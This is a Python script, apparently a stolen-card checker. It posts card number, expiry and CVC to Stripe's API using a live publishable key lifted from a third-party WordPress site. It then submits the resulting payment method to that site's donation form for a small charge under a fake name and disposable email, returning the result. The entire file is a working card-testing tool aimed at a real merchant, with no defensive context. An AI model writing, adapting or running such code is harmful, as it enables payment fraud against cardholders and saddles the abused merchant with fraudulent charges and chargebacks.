import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F13dc22628e%3B+stripe-js-v3%2F13dc22628e%3B+card-element&referrer=https%3A%2F%2Fdjlu.fun&time_on_page=191080&key=pk_live_51IMjnZFjjQsFZDBwKYwbprbal1lLYIKbpfWTaomI8xQ4A8KggMQHPy0bFYDQQXj2vczC3dFZR8I02XK1CzSeZDpW00WyZh3wjE'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': 'e697d32a-b575-48ff-b0af-36be002095f394eeba',
	    '__stripe_sid': '0a8817e7-0772-416e-8a21-00c6fe3a3c832e7c0f',
	}
	
	headers = {
	    'authority': 'djlu.fun',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=e697d32a-b575-48ff-b0af-36be002095f394eeba; __stripe_sid=0a8817e7-0772-416e-8a21-00c6fe3a3c832e7c0f',
	    'origin': 'https://djlu.fun',
	    'pragma': 'no-cache',
	    'referer': 'https://djlu.fun/index.php/mesmerize/payment-form/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1732231687823',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=562&_fluentform_26_fluentformnonce=8c109b8d15&_wp_http_referer=%2Findex.php%2Fmesmerize%2Fpayment-form%2F&names%5Bfirst_name%5D=Vinsmoke&names%5Blast_name%5D=Sanji&email=jemase9334%40exoular.com&numeric-field=1&payment_method=stripe&custom-payment-amount=1.04&item__26__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '26',
	}
	
	r2 = requests.post('https://djlu.fun/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())